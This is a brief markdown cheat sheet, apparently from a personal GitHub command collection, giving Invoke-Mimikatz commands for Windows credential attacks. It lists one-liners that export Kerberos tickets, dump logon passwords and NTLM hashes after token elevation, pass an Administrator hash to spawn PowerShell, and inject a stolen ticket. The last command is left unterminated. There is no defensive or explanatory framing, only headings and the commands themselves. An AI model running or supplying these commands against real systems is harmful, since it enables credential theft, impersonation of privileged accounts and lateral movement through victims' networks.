## Mimikatz dump tickets


```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
## Mimikatz dump NTLM hashes

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```

## Mimikatz pass the hashes

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:some.domain.local /ntlm:brydaafdsafd3524frw4fe4f /run:powershell.exe"'
```

## Mimikatz pass the tickets

```
Invoke-Mimikatz -Command '"kerberos::ptt haisdfhaoigehrsfoirqaejfoijio(ticket).kirbi
```

![image](https://github.com/Luminous-split/LifeLongCommands/assets/116489011/e7174e46-0541-4686-bbf7-17e71e3bc679)
